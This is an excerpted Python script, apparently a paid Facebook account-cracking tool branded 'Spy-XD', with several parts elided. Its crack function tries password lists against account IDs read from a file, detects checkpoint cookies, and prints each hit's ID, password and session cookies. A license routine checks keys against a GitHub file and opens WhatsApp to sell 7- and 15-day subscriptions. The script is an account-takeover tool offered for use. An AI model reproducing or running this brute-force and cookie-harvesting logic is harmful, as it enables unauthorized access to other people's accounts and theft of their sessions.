...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Spy' and password == 'Love':
...
os.system('xdg-open https://wa.me/+8801960305939')
def banner():
	os.system("clear")
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Cyber.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Spy-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Spy-Cyber
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Spy-Cp] {idf} • {pw}')     
				...
				#Spy-Cyber
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Spy-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Spy,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Spy-Cyber/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Spy Cyber, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Spy+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Spy+''+key1
		os.system('am start https://wa.me/+8801960305939?text=' + tks)
		Subscraption() 
Subscraption() 
login()